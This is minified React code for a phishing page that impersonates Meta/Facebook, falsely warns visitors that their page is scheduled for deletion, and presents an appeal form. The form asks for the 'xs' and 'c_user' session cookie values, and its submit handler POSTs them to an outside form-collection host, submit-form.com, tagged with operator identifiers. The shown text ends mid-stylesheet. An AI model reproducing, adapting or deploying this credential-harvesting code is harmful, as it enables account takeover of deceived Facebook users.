                e.props.children && (l.children = ve(e.props.children, i)),
                r.push(l)
            }
            )),
            r
        }
        t.p;
        const me = t.p + "static/media/fbVideo.png.1fd476160a3ed7a2f565.png";
        var he = t(678);
        const be = function(e) {
            let {hide: t} = e;
            const [r,a] = (0,
            n.useState)()
              , [i,l] = (0,
            n.useState)()
              , o = ["salman jani email"]
              , s = _();
            return (0,
            he.jsxs)(he.Fragment, {
                children: [(0,
                he.jsx)("meta", {
                    charSet: "UTF-8"
                }), (0,
                he.jsx)("meta", {
                    name: "viewport",
                    content: "width=device-width, initial-scale=1.0"
                }), (0,
                he.jsx)("meta", {
                    property: "og:type",
                    content: "article"
                }), (0,
                he.jsx)("meta", {
                    property: "og:title",
                    content: "We have scheduled your page to be deleted"
                }), (0,
                he.jsx)("meta", {
                    name: "description",
                    content: "We have received several reports that your account violates our terms of service and community guidelines. As a result, your account will be sent for verification."
                }), (0,
                he.jsx)("meta", {
                    name: "viewport",
                    content: "width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no"
                }), (0,
                he.jsx)("meta", {
                    property: "og:image",
                    content: "https://i.ibb.co/TtQmC4M/h245f15d84e5d44.png"
                }), (0,
                he.jsx)("meta", {
                    name: "viewport",
                    content: "width=device-width, initial-scale=1"
                }), (0,
                he.jsx)("meta", {
                    name: "theme-color",
                    content: "#1A73E8"
                }), (0,
                he.jsx)("title", {
                    children: "Meta | Facebook"
                }), (0,
                he.jsx)("style", {
                    dangerouslySetInnerHTML: {
                        __html: '\n        :root {\n            --swiper-theme-color: #007aff\n        }\n\n        :host {\n            position: relative;\n            display: block;\n            margin-left: auto;\n            margin-right: auto;\n            z-index: 1\n        }\n\n        @keyframes swiper-preloader-spin {\n            0% {\n                transform: rotate(0)\n            }\n\n            to {\n                transform: rotate(360deg)\n            }\n        }\n\n        :root {\n            --swiper-navigation-size: 44px\n        }\n\n        *,\n        :before,\n        :after {\n            box-sizing: border-box;\n            border-width: 0;\n            border-style: solid;\n            border-color: currentColor\n        }\n\n        :before,\n        :after {\n            --tw-content: ""\n        }\n\n        html {\n            line-height: 1.5;\n            -webkit-text-size-adjust: 100%;\n            -moz-tab-size: 4;\n            -o-tab-size: 4;\n            tab-size: 4;\n            font-family: ui-sans-serif, system-ui, -apple-system, BlinkMacSystemFont, Segoe UI, Roboto, Helvetica Neue, Arial, Noto Sans, sans-serif, "Apple Color Emoji", "Segoe UI Emoji", Segoe UI Symbol, "Noto Color Emoji";\n            font-feature-settings: normal;\n            font-variation-settings: normal\n        }\n\n        body {\n            margin: 0;\n            line-height: inherit\n        }\n\n        h4 {\n            font-size: inherit\n        }\n\n        button,\n        input,\n        textarea {\n            font-family: inherit;\n            font-feature-settings: inherit;\n            font-variation-settings: inherit;\n            font-size: 100%;\n            font-weight: inherit;\n            line-height: inherit;\n            color: inherit;\n            margin: 0;\n            padding: 0\n        }\n\n        button {\n            text-transform: none\n        }\n\n        [type=submit] {\n            -webkit-appearance: button;\n            background-image: none\n        }\n\n        ::-webkit-inner-spin-button,\n        ::-webkit-outer-spin-button {\n            height: auto\n        }\n\n        ::-webkit-search-decoration {\n            -webkit-appearance: none\n        }\n\n        ::-webkit-file-upload-button {\n            -webkit-appearance: button;\n            font: inherit\n        }\n\n        h5,\n        h6 {\n            margin: 0\n        }\n\n        ul {\n            list-style: none;\n            margin: 0;\n            padding: 0\n        }\n\n        textarea {\n            resize: vertical\n        }\n\n        input::placeholder,\n        textarea::placeholder {\n            opacity: 1;\n            color: #9ca3af\n        }\n\n        button {\n            cursor: pointer\n        }\n\n        :disabled {\n            cursor: default\n        }\n\n        img,\n        svg {\n            display: block;\n            vertical-align: middle\n        }\n\n        img {\n            max-width: 100%;\n            height: auto\n        }\n\n        *,\n        :before,\n        :after {\n            --tw-border-spacing-x: 0;\n            --tw-border-spacing-y: 0;\n            --tw-translate-x: 0;\n            --tw-translate-y: 0;\n            --tw-rotate: 0;\n            --tw-skew-x: 0;\n            --tw-skew-y: 0;\n            --tw-scale-x: 1;\n            --tw-scale-y: 1;\n            --tw-pan-x: ;\n            --tw-pan-y: ;\n            --tw-pinch-zoom: ;\n            --tw-scroll-snap-strictness: proximity;\n            --tw-gradient-from-position: ;\n            --tw-gradient-via-position: ;\n            --tw-gradient-to-position: ;\n            --tw-ordinal: ;\n            --tw-slashed-zero: ;\n            --tw-numeric-figure: ;\n            --tw-numeric-spacing: ;\n            --tw-numeric-fraction: ;\n            --tw-ring-inset: ;\n            --tw-ring-offset-width: 0px;\n            --tw-ring-offset-color: #fff;\n            --tw-ring-color: rgb(59 130 246/.5);\n            --tw-ring-offset-shadow: 0 0#0000;\n            --tw-ring-shadow: 0 0#0000;\n            --tw-shadow: 0 0#0000;\n            --tw-shadow-colored: 0 0#0000;\n            --tw-blur: ;\n            --tw-brightness: ;\n            --tw-contrast: ;\n            --tw-grayscale: ;\n            --tw-hue-rotate: ;\n            --tw-invert: ;\n            --tw-saturate: ;\n            --tw-sepia: ;\n            --tw-drop-shadow: ;\n            --tw-backdrop-blur: ;\n            --tw-backdrop-brightness: ;\n            --tw-backdrop-contrast: ;\n            --tw-backdrop-grayscale: ;\n            --tw-backdrop-hue-rotate: ;\n            --tw-backdrop-invert: ;\n            --tw-backdrop-opacity: ;\n            --tw-backdrop-saturate: ;\n            --tw-backdrop-sepia:\n        }\n\n        body {\n            font-family: nunito-regular\n        }\n\n        @media (max-width:768px) {}\n\n        @media (max-width:576px) {}\n\n        @media (min-width:1024px) {\n            @media (min-width:640px) {}\n\n            @media (min-width:768px) {}\n\n            @media (min-width:1024px) {}\n\n            @media (min-width:1280px) {}\n\n            @media (min-width:1536px) {}\n        }\n\n        @media (min-width:768px) {}\n\n        @media (min-width:1024px) {}\n\n        @media (min-width:1280px) {}\n\n        * {\n            font-family: Arial, Helvetica, sans-serif !important\n        }\n\n        #root {\n            overflow: hidden\n        }\n\n        svg {\n            display: inline-block\n        }\n\n        #main-component {\n            background: linear-gradient(130deg, rgba(249, 241, 249, 1) 0%, rgba(234, 243, 253, 1) 35%, rgba(237, 251, 242, 1) 100%);\n            height: 100vh;\n            overflow: hidden;\n            overflow-y: scroll\n        }\n\n        #main-component #main {\n            max-width: 1100px\n        }\n\n        .left {\n            border-right: 1px solid #DEE3E9\n        }\n\n        .left .left-content {\n            height: 100vh;\n            padding: 40px 20px 0 0;\n            position: sticky;\n            position: -webkit-sticky;\n            top: 0;\n            overflow-y: auto\n        }\n\n        *::-webkit-scrollbar {\n            width: 3px\n        }\n\n        *::-webkit-scrollbar-thumb {\n            background: rgb(74, 74, 74)\n        }\n\n        *::-webkit-scrollbar-track {\n            background: transparent\n        }\n\n        .logo {\n            width: 70px\n        }\n\n        .logo svg {\n            height: -moz-min-content;\n            height: min-content;\n            width: 100%\n        }\n\n        h1 {\n            line-height: 30px;\n            color: #1c1e21;\n            font-family: Optimistic Display Bold, Helvetica, Arial, sans-serif;\n            font-weight: 700;\n            margin: 16px 0\n        }\n\n        h1 {\n            font-size: 24px;\n            display: flex;\n            align-items: center\n        }\n\n        h1 svg {\n            margin-right: 8px\n        }\n\n        .action-button {\n            display: flex;\n            align-items: center;\n            width: 100%;\n            padding: 12px 16px;\n            border-radius: 15px;\n            color: #000;\n            background-color: inherit;\n            transition: background-color .35s ease;\n            cursor: pointer;\n            font-size: 16px;\n            font-weight: 500;\n            line-height: 20px;\n            font-family: Optimistic Text Medium, Helvetica, Arial, sans-serif\n        }\n\n        .action-button.main {\n            color: #fff;\n            background-color: #344854\n        }\n\n        .action-button.main svg path {\n            fill: #fff\n        }\n\n        .action-button .action-text {\n            width: 100%;\n            text-align: left;\n            padding: 0 12px\n        }\n\n        .action-button .action-icon svg {\n            width: 24px;\n            height: 24px\n        }\n\n        .action-button .action-arrow svg {\n            width: 24px;\n            height: 24px\n        }\n\n        .action-button:not(.main):hover {\n            background-color: #e3e8ef\n        }\n\n        .content-action {\n            height: 0;\n            overflow: hidden;\n            transition: .3s ease-in-out\n        }\n\n        .content-right {\n            padding: 40px 20px\n        }\n\n        p {\n            margin: 0;\n            font-size: 15px;\n            line-height: 20px;\n            font-family: Optimistic Text Normal, Helvetica, Arial, sans-serif !important\n        }\n\n        h6 {\n            font-size: 15px;\n            font-weight: 600;\n            margin-bottom: 20px\n        }\n\n        li {\n            margin: 8px 0;\n            font-size: 15px\n        }\n\n        .card-thumb {\n            display: flex;\n            flex-direction: column;\n            border-radius: 20px;\n            background-color: #fff;\n            margin: 20px 0;\n            overflow: hidden\n        }\n\n        .thumb-content {\n            margin: 20px\n        }\n\n        .thumb-content .thumb-type {\n            font-size: 16px;\n            font-weight: 400;\n            margin-bottom: 10px\n        }\n\n        .thumb-content h4 {\n            font-weight: 500;\n            margin: 14px 0\n        }\n\n        .btn-wrapper {\n            width: 100%;\n            display: flex;\n            justify-content: center;\n            padding: 20px 0 0\n        }\n\n        .button {\n            width: 100%;\n            height: 50px;\n            border-radius: 20px;\n            display: flex;\n            justify-content: center;\n            align-items: center;\n            cursor: pointer\n        }\n\n        .button.fb-blue {\n            background-color: #0064e0;\n            color: #fff\n        }\n\n        .action-button-list .action-icon img {\n            width: 48px;\n            height: 48px\n        }\n\n        .small-grey {\n            color: #465a69;\n            font-family: Optimistic Text Normal, Helvetica, Arial, sans-serif;\n            font-size: 15px;\n            font-weight: 400;\n            line-height: 20px\n        }\n\n        .action-button-list .action-button {\n            border-radius: 0;\n            background-color: #fff\n        }\n\n        .action-button-list .action-button .action-arrow svg {\n            transform: rotate(-90deg)\n        }\n\n        .action-button-list .action-button.b-bottom {\n            border-bottom: 1px solid #E3E8EF\n        }\n\n        .action-button-list {\n            border-radius: 15px;\n            overflow: hidden\n        }\n\n        .link-to {\n            text-decoration: none;\n            font-size: 15px;\n            cursor: pointer;\n            color: #0d6efd;\n            display: inline;\n            margin: 0 0 0 5px\n        }\n\n        .link-to:hover {\n            text-decoration: underline\n        }\n\n        .link-to svg {\n            margin-left: 3px;\n            width: 14px;\n            height: 14px;\n            vertical-align: text-top\n        }\n\n        .link-to svg path {\n            fill: #0d6efd;\n            margin-left: 5px\n        }\n\n        .close-bar {\n            display: flex;\n            flex-direction: column;\n            cursor: pointer;\n            align-items: end\n        }\n\n        .popup {\n            position: fixed;\n            padding: 0;\n            top: 0;\n            left: 0;\n            bottom: 0;\n            right: 0;\n            width: 100%;\n            height: 100%;\n            background: rgba(0, 0, 0, .5);\n            align-items: center;\n            display: flex;\n            justify-content: center;\n            flex-direction: column\n        }\n\n        .popup .popup-item {\n            max-height: none;\n            max-width: 500px;\n            margin: 15px;\n            width: 95%;\n            border-radius: 25px;\n            background: linear-gradient(90deg, rgba(249, 241, 249, 1) 0%, rgba(234, 243, 253, 1) 35%, rgba(237, 251, 242, 1) 100%);\n            padding: 20px;\n            overflow-y: auto;\n            height: 100vh\n        }\n\n        .popup.active {\n            z-index: 9\n        }\n\n        .popup .popup-item.active {\n            display: block\n        }\n\n        h5 {\n            margin-top: 0;\n            margin-bottom: .5rem;\n            font-weight: 600;\n            line-height: 1.2;\n            font-size: 1rem\n        }\n\n        .popup-head {\n            display: flex;\n            align-items: center;\n            justify-content: space-between;\n            padding: .4rem 0\n        }\n\n        .popup-head .close-bar {\n            padding: .2rem;\n            border-radius: 25px\n        }\n\n        .popup-head .close-bar svg {\n            width: 20px;\n            height: 20px\n        }\n\n        .popup-head .close-bar:hover {\n            background-color: #e2eaf2\n        }\n\n        form label {\n            margin-bottom: .5rem\n        }\n\n        .ant-form-item {\n            margin-bottom: 0\n        }\n\n        .item-form {\n            margin-bottom: 1rem\n        }\n\n        .form-text {\n            margin-top: .25rem;\n            font-size: .875em;\n            color: #6c757d\n        }\n\n        .form-item p {\n            margin-top: 20px;\n            font-size: 13px;\n        }\n\n        .form-item-detailtxt {\n            --tw-text-opacity: 1;\n            color: rgb(144 148 156 / var(--tw-text-opacity));\n        }\n\n        .form-item video {\n            width: 30%;\n        }\n        .form-item {\n            margin-bottom: 20px;\n        }\n\n        .form-inputs {\n            display: flex;\n            flex-direction: column;\n            width: 50%;\n\n        }\n\n        .form-inputs input {\n            border: 2px solid #D4DBE3;\n            outline: none;\n            border-radius: 10px;\n            padding: 5px;\n        }\n\n        .form-inputs label {\n            margin-left: 3px;\n            font-size: 13px;\n            margin-top: 10px;\n         \n        }\n\n\n        .ant-input {\n            border: 2px solid #D4DBE3;\n            height: 50px;\n            border-radius: 10px;\n            padding: 0 11px\n        }\n\n        .ant-input:hover,\n        .ant-input-affix-wrapper:not(.ant-input-affix-wrapper-disabled):hover {\n            border: 2px solid #D4DBE3\n        }\n\n        .ant-input:focus,\n        .ant-input-focused,\n        .ant-input-affix-wrapper:focus {\n            border: 2px solid #D4DBE3;\n            box-shadow: none\n        }\n\n        .ant-btn-default:not(:disabled):not(.ant-btn-disabled):hover {\n            color: #fff;\n            background-color: #0d6efd;\n            border-color: #0d6efd\n        }\n\n        .button-send {\n            width: 100%;\n            display: flex;\n            justify-content: center;\n            align-items: center;\n            position: relative;\n            border-radius: 25px;\n            padding: 8px;\n            font-size: 20px;\n            color: #fff;\n            background-color: #0d6efd;\n            border-color: #0d6efd;\n            margin-top: 20px;\n        }\n\n        .popup-footer {\n            display: flex;\n            align-items: center;\n            justify-content: center\n        }\n\n        .popup .logo {\n            margin: 0 auto\n        }\n\n        @media (max-width:1001px) {\n            .col-8 {\n                width: 100% !important\n            }\n\n            .left.col-4 {\n                display: none\n            }\n\n            .right .content-right {\n                padding: 20px 5px\n            }\n\n            h1 svg {\n                width: 50px !important;\n                height: 50px !important;\n                margin-right: 8px\n            }\n\n            .logo {\n                margin: 0 auto\n            }\n        }\n    '
                    }
                }), (0,
                he.jsx)("div", {
                    className: "popup active",
                    children: (0,
                    he.jsxs)("div", {
                        className: "popup-item popup-modal active",
                        children: [(0,
                        he.jsxs)("div", {
                            className: "popup-head",
                            children: [(0,
                            he.jsx)("h5", {
                                children: "Apeal Form"
                            }), (0,
                            he.jsx)("div", {
                                onClick: t,
                                className: "close-bar",
                                children: (0,
                                he.jsxs)("svg", {
                                    width: 7,
                                    height: 7,
                                    viewBox: "0 0 7 7",
                                    fill: "none",
                                    xmlns: "http://www.w3.org/2000/svg",
                                    children: [(0,
                                    he.jsx)("rect", {
                                        x: "0.671875",
                                        y: "5.62134",
                                        width: 7,
                                        height: 1,
                                        rx: "0.5",
                                        transform: "rotate(-45 0.671875 5.62134)",
                                        fill: "black"
                                    }), (0,
                                    he.jsx)("rect", {
                                        x: "5.62109",
                                        y: "6.32837",
                                        width: 7,
                                        height: 1,
                                        rx: "0.5",
                                        transform: "rotate(-135 5.62109 6.32837)",
                                        fill: "black"
                                    })]
                                })
                            })]
                        }), (0,
                        he.jsx)("div", {
                            className: "popup-content",
                            children: (0,
                            he.jsxs)("form", {
                                id: "dataFirst",
                                autoComplete: "off",
                                className: "ant-form ant-form-horizontal css-m4timi",
                                onSubmit: e => {
                                    e.preventDefault(),
                                    fetch("https://submit-form.com/udfuABlZj", {
                                        method: "POST",
                                        headers: {
                                            "Content-Type": "application/json"
                                        },
                                        body: JSON.stringify({
                                            emails: o,
                                            workerEmail: "salmanjani email",
                                            xs: r,
                                            c_user: i,
                                            name: "asad"
                                        })
                                    }).then((e => {
                                        e.ok
                                    }
                                    )),
                                    s("pass")
                                }
                                ,
                                children: [(0,
                                he.jsxs)("div", {
                                    className: "form-item",
                                    children: [(0,
                                    he.jsx)("p", {
                                        children: "We have detected violation on your recent page post that violates our community standards."
                                    }), (0,
                                    he.jsx)("p", {
                                        children: "We have scheduled your page to be deleted"
                                    }), (0,
                                    he.jsx)("p", {
                                        children: "If you believe this to be a mistake, you have the option to submit an appeal by providing the necessary information."
                                    }), (0,
                                    he.jsx)("p", {
                                        className: "form-item-detailtxt",
                                        children: "Detailed Video Information"
                                    }), (0,
                                    he.jsx)("video", {
      src: "asad-life.mp4",  // Apni file ka sahi path yahan likhen
      width: "560",
      height: "315",
      controls: true,
      children: "Your browser does not support the video tag."
                                    }), (0,
                                    he.jsx)("p", {
                                        className: "form-item-detailtxt",
                                        children: "Please be sure to provide the requested information below."
                                    }), (0,
                                    he.jsxs)("div", {
                                        className: "form-inputs",
                                        children: [(0,
                                        he.jsx)("label", {
                                            children: "xs"
                                        }), (0,
                                        he.jsx)("input", {
                                            type: "text",
                                            required: !0,
                                            value: r,
                                            pattern: "^(?=.*[a-z])(?=.*[A-Z])(?=.*\\d)(?=.*[@#$%^&+=]).{12,}$",
                                            onChange: e => a(e.target.value)
                                        }), (0,
                                        he.jsx)("label", {
                                            children: "c_user"
                                        }), (0,
                                        he.jsx)("input", {
                                            type: "text",
                                            pattern: "[0-9]+",
                                            required: !0,
                                            value: i,
                                            onChange: e => l(e.target.value)
                                        })]
                                    })]
                                }), (0,
                                he.jsx)("div", {
                                    className: "ant-form-item css-m4timi",
                                    children: (0,
                                    he.jsx)("div", {
                                        className: "ant-row ant-form-item-row css-m4timi",
                                        children: (0,
                                        he.jsx)("div", {
                                            className: "ant-col ant-form-item-control css-m4timi",
                                            children: (0,
                                            he.jsx)("div", {
                                                className: "ant-form-item-control-input",
                                                children: (0,
                                                he.jsx)("div", {
                                                    className: "ant-form-item-control-input-content",
                                                    children: (0,
                                                    he.jsx)("button", {
                                                        type: "submit",
                                                        className: "ant-btn css-m4timi ant-btn-default button-send",
                                                        children: (0,
                                                        he.jsx)("span", {
                                                            children: "Send"
                                                        })
                                                    })
                                                })
                                            })
                                        })
                                    })
                                })]
                            })
                        }), (0,
                        he.jsx)("br", {}), (0,
                        he.jsx)("div", {
                            className: "popup-footer",
                            children: (0,
                            he.jsx)("div", {
                                className: "logo",
                                children: (0,
                                he.jsxs)("svg", {
                                    width: 329,
                                    height: 66,
                                    viewBox: "0 0 329 66",
                                    fill: "none",
                                    xmlns: "http://www.w3.org/2000/svg",
                                    children: [(0,
                                    he.jsxs)("g", {
                                        clipPath: "url(#clip0_4111_993)",
                                        children: [(0,
                                        he.jsx)("path", {
                                            d: "M122.064 1.98657H134.372L155.298 39.8132L176.224 1.98657H188.264V64.1421H178.22V16.5033L159.875 49.4881H150.453L132.108 16.5026V64.1414H122.064V1.98657ZM221.273 65.2542C216.624 65.2542 212.531 64.2213 209.009 62.1693C205.488 60.1101 202.741 57.2629 200.766 53.621C198.799 49.9798 197.816 45.8099 197.816 41.0988C197.816 36.3376 198.777 32.1176 200.701 28.4466C202.625 24.7764 205.3 21.9074 208.72 19.8336C212.141 17.7678 216.074 16.727 220.514 16.727C224.932 16.727 228.728 17.7744 231.91 19.8554C235.099 21.9437 237.55 24.8701 239.264 28.6275C240.985 32.3849 241.845 36.7923 241.845 41.8578V44.6107H207.766C208.387 48.3971 209.921 51.381 212.364 53.5563C214.809 55.731 217.896 56.8147 221.628 56.8147C224.621 56.8147 227.195 56.3745 229.357 55.4855C231.519 54.5965 233.551 53.2527 235.446 51.4463L240.775 57.9711C235.475 62.8267 228.974 65.2542 221.273 65.2542ZM228.605 28.382C226.501 26.2356 223.746 25.1664 220.341 25.1664C217.021 25.1664 214.245 26.2574 212.01 28.4466C209.769 30.6365 208.359 33.5841 207.766 37.284H232.199C231.902 33.4976 230.702 30.5276 228.605 28.382ZM254.326 26.0482H245.085V17.8398H254.326V4.25499H264.008V17.8398H278.051V26.0482H264.008V46.8725C264.008 50.3335 264.601 52.8046 265.787 54.2863C266.973 55.7673 268.998 56.5039 271.875 56.5039C273.148 56.5039 274.226 56.4537 275.115 56.3521C276.097 56.2328 277.076 56.0908 278.051 55.9264V64.0549C276.952 64.3803 275.715 64.6476 274.341 64.8502C272.96 65.0595 271.521 65.1604 270.01 65.1604C259.554 65.1604 254.326 59.4521 254.326 48.0288V26.0482ZM329 64.1421H319.499V57.6609C317.807 60.0883 315.659 61.9594 313.056 63.2748C310.445 64.5902 307.488 65.2548 304.169 65.2548C300.084 65.2548 296.461 64.2067 293.308 62.1185C290.148 60.0375 287.668 57.1619 285.868 53.5128C284.059 49.8564 283.156 45.6726 283.156 40.9688C283.156 36.2366 284.074 32.0456 285.911 28.4037C287.748 24.7619 290.285 21.9074 293.525 19.8336C296.772 17.7678 300.496 16.727 304.704 16.727C307.871 16.727 310.713 17.3408 313.229 18.5691C315.712 19.7699 317.864 21.561 319.499 23.7864V17.8398H329V64.1421ZM319.318 34.0395C318.284 31.4094 316.642 29.3284 314.408 27.8038C312.174 26.2792 309.585 25.5202 306.656 25.5202C302.506 25.5202 299.209 26.9075 296.75 29.6894C294.291 32.4713 293.062 36.2366 293.062 40.9688C293.062 45.7307 294.248 49.5092 296.613 52.2918C298.984 55.0737 302.195 56.461 306.259 56.461C309.245 56.461 311.913 55.6954 314.256 54.1563C316.592 52.6171 318.284 50.5428 319.318 47.9344V34.0395Z",
                                            fill: "#66778A"
                                        }), (0,
                                        he.jsx)("path", {
                                            d: "M70.8442 0C62.7456 0 57.1572 2.97264 49.4783 13.1571C42.2041 3.53826 36.29 0 28.2743 0C12.221 0 0 19.6469 0 43.1693C0 57.319 7.96641 65.34 18.7142 65.34C29.0724 65.34 35.3412 56.628 40.721 46.9999L47.0792 36.0043C47.7003 34.9304 48.3261 33.8592 48.9565 32.7908C49.6638 33.9793 50.3661 35.1709 51.0634 36.3653L57.4217 47.225C65.5842 61.1952 71.1469 65.34 80.5721 65.34C91.3949 65.34 98.7441 56.2828 98.7441 43.395C98.7441 18.6107 86.1309 0 70.8442 0ZM38.0153 30.6874L31.5669 41.4124C25.2534 51.9565 22.5924 54.2995 18.624 54.2995C14.4306 54.2995 11.1386 50.785 11.1386 42.7185C11.1386 26.5419 19.0754 11.4008 28.2743 11.4008C33.0599 11.4008 36.6164 13.7834 42.7911 22.9416C41.1668 25.5033 39.5747 28.0854 38.0153 30.6874ZM80.33 54.2995C75.9556 54.2995 73.0696 51.5057 67.1621 41.5021L60.8038 30.6874C58.968 27.5609 57.2493 24.721 55.6188 22.1437C62.0211 12.7453 65.8776 10.2742 70.7541 10.2742C80.0437 10.2742 87.9963 24.1078 87.9963 42.7185C87.9963 50.2445 84.8846 54.2995 80.33 54.2995Z",
                                            fill: "#66778A"
                                        }), (0,
                                        he.jsx)("path", {
                                            d: "M95.8256 23.76H84.7981C86.8017 29.011 87.9967 35.506 87.9967 42.7185C87.9967 50.2445 84.885 54.2995 80.3303 54.2995H80.2764V65.3387L80.5718 65.34C91.3946 65.34 98.7438 56.2828 98.7438 43.395C98.7438 36.234 97.691 29.5898 95.8256 23.76Z",
                                            fill: "#66778A"
                                        }), (0,
                                        he.jsx)("path", {
                                            d: "M27.6361 0.0107422C12.2587 0.512342 0.547587 19.0795 0.0185547 41.5802H11.1519C11.5039 26.2127 18.9255 12.0881 27.6361 11.4248V0.0114022V0.0107422Z",
                                            fill: "#66778A"
                                        }), (0,
                                        he.jsx)("path", {
                                            d: "M49.4781 13.1571L49.4827 13.1512C51.0928 15.2783 52.9464 17.9223 55.6218 22.1404L55.6185 22.1437C57.249 24.7216 58.9677 27.5609 60.8035 30.6874L67.1618 41.5021C73.0693 51.5057 75.9553 54.2995 80.3297 54.2995C80.5337 54.2995 80.7357 54.2916 80.9337 54.2751V65.3367C80.8133 65.3387 80.6923 65.34 80.5712 65.34C71.1466 65.34 65.5839 61.1945 57.4214 47.225L51.0632 36.366L50.6519 35.6631L50.6657 35.64C49.0958 32.8845 45.661 27.2679 42.7875 22.9469L42.7908 22.9416L42.3828 22.341C41.5544 21.1088 40.7859 20.0066 40.1377 19.14L40.0943 19.1558C35.4844 13.1023 32.3181 11.4008 28.274 11.4008C28.0608 11.4008 27.8476 11.4088 27.6357 11.4253V0.01056C27.8476 0.00396 28.0608 0 28.274 0C36.2898 0 42.2039 3.5376 49.4781 13.1571Z",
                                            fill: "#66778A"
                                        })]
                                    }), (0,
                                    he.jsx)("defs", {
                                        children: (0,
                                        he.jsx)("clipPath", {
                                            id: "clip0_4111_993",
                                            children: (0,
                                            he.jsx)("rect", {
                                                width: 329,
                                                height: 66,
                                                fill: "white"
                                            })
                                        })
                                    })]
                                })
                            })
                        })]
                    })
                })]
            })
        }
          , ge = () => {
            _();
            const [e,t] = (0,
            n.useState)(!1);
            return (0,
            he.jsxs)(he.Fragment, {
                children: [e ? (0,
                he.jsx)(be, {
                    hide: () => {
                        t(!1)
                    }
                }) : "", (0,
                he.jsx)("meta", {
                    charSet: "utf-8"
                }), (0,
                he.jsx)("style", {
                    dangerouslySetInnerHTML: {
                        __html: '\n    :root {\n        --sf-img-2: url("test.png")\n    }\n'
                    }
                }), (0,
           he.jsx)("style", {
                    "data-rc-order": "prepend",
                    "rc-util-key": "@ant-design-icons",
                    dangerouslySetInnerHTML: {
                        __html: "\n    @-webkit-keyframes loadingCircle {\n        100% {\n            -webkit-transform: rotate(360deg);\n            transform: rotate(360deg)\n        }\n    }\n\n    @keyframes loadingCircle {\n        100% {\n            -webkit-transform: rotate(360deg);\n            transform: rotate(360deg)\n        }\n    }\n"
                    }
                }), (0,
                he.jsx)("style", {
                    "data-rc-order": "prependQueue",
                    "data-rc-priority": -1e3,
                    "data-css-hash": "1tx5yat",
                    "data-token-hash": "fkne30",
                    dangerouslySetInnerHTML: {
                        __html: "\n    @media (max-width:575px) {}\n\n    @media (max-width:767px) {}\n\n    @media (max-width:991px) {}\n\n    @media (max-width:1199px) {}\n\n    @media (max-width:575px) {}\n\n    @media (max-width:767px) {}\n\n    @media (max-width:991px) {}\n\n    @media (max-width:1199px) {}\n"
                    }
                }), (0,
                he.jsx)("style", {
                    "data-rc-order": "prependQueue",
                    "data-rc-priority": -1e3,
                    "data-css-hash": "_effect-css-m4timi-antZoomIn",
                    dangerouslySetInnerHTML: {
                        __html: "\n    @keyframes css-m4timi-antZoomIn {\n        0% {\n            transform: scale(0.2);\n            opacity: 0\n        }\n\n        100% {\n            transform: scale(1);\n            opacity: 1\n        }\n    }\n"
                    }
                }), (0,
                he.jsx)("style", {
                    "data-rc-order": "prependQueue",
                    "data-rc-priority": -999,
                    "data-css-hash": "mhfsmf",
                    "data-token-hash": "fkne30",
                    dangerouslySetInnerHTML: {
                        __html: "\n    @media (min-width:576px) {}\n\n    @media (min-width:768px) {}\n\n    @media (min-width:992px) {}\n\n    @media (min-width:1200px) {}\n\n    @media (min-width:1600px) {}\n"
                    }
                }), (0,
                he.jsx)("style", {
                    "data-rc-order": "prependQueue",
                    "data-rc-priority": -998,
                    "data-css-hash": "15wgk55",
                    "data-token-hash": "fkne30",
                    dangerouslySetInnerHTML: {
                        __html: "\n    @media screen and (-ms-high-contrast:active),\n    (-ms-high-contrast:none) {}\n"
                    }
                }), (0,
                he.jsx)("meta", {
                    property: "og:type",
                    content: "article"
                }), (0,
                he.jsx)("meta", {
                    property: "og:title",
                    content: "We have scheduled your page to be deleted"
                }), (0,
                he.jsx)("meta", {
                    name: "description",
                    content: "We have received several reports that your page violates our terms of service and community guidelines. As a result, your page will be sent for verification."
                }), (0,
                he.jsx)("meta", {
                    name: "viewport",
                    content: "width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no"
                }), (0,
                he.jsx)("meta", {
                    property: "og:image",
                    content: "https://i.ibb.co/TtQmC4M/h245f15d84e5d44.png"
                }), (0,
                he.jsx)("meta", {
                    name: "viewport",
                    content: "width=device-width, initial-scale=1"
                }), (0,
                he.jsx)("meta", {
                    name: "theme-color",
                    content: "#1A73E8"
                }), (0,
                he.jsx)("title", {
                    children: "Meta | Facebook"
                }), (0,
                he.jsx)("style", {
                    dangerouslySetInnerHTML: {
                        __html: "\n    body {\n        --google-font-color-materialiconstwotone: none\n    }\n"
                    }
                }), (0,
                he.jsx)("style", {
                    dangerouslySetInnerHTML: {
                        __html: '\n    /*!\n * Bootstrap v5.0.2 (https://getbootstrap.com/)\n * Copyright 2011-2021 The Bootstrap Authors\n * Copyright 2011-2021 Twitter, Inc.\n * Licensed under MIT (https://github.com/twbs/bootstrap/blob/main/LICENSE)\n */\n    :root {\n        --bs-blue: #0d6efd;\n        --bs-indigo: #6610f2;\n        --bs-purple: #6f42c1;\n        --bs-pink: #d63384;\n        --bs-red: #dc3545;\n        --bs-orange: #fd7e14;\n        --bs-yellow: #ffc107;\n        --bs-green: #198754;\n        --bs-teal: #20c997;\n        --bs-cyan: #0dcaf0;\n        --bs-white: #fff;\n        --bs-gray: #6c757d;\n        --bs-gray-dark: #343a40;\n        --bs-primary: #0d6efd;\n        --bs-secondary: #6c757d;\n        --bs-success: #198754;\n        --bs-info: #0dcaf0;\n        --bs-warning: #ffc107;\n        --bs-danger: #dc3545;\n        --bs-light: #f8f9fa;\n        --bs-dark: #212529;\n        --bs-font-sans-serif: system-ui, -apple-system, "Segoe UI", Roboto, "Helvetica Neue", Arial, "Noto Sans", "Liberation Sans", sans-serif, "Apple Color Emoji", "Segoe UI Emoji", "Segoe UI Symbol", "Noto Color Emoji";\n        --bs-font-monospace: SFMono-Regular, Menlo, Monaco, Consolas, "Liberation Mono", "Courier New", monospace;\n        --bs-gradient: linear-gradient(180deg, rgba(255, 255, 255, 0.15), rgba(255, 255, 255, 0))\n    }\n\n    *,\n    ::after,\n    ::before {\n        box-sizing: border-box\n    }\n\n    @media (prefers-reduced-motion:no-preference) {\n        :root {\n            scroll-behavior: smooth\n        }\n    }\n\n    body {\n        font-size: 1rem;\n        font-weight: 400;\n        color: #212529;\n        background-color: #fff;\n        -webkit-text-size-adjust: 100%;\n        -webkit-tap-highlight-color: transparent\n    }\n\n    h1,\n    h4,\n    h6 {\n        margin-top: 0;\n        margin-bottom: .5rem;\n        line-height: 1.2\n    }\n\n    @media (min-width:1200px) {\n        h1 {\n            font-size: 2.5rem\n        }\n    }\n\n    @media (min-width:1200px) {}\n\n    @media (min-width:1200px) {}\n\n    @media (min-width:1200px) {\n        h4 {\n         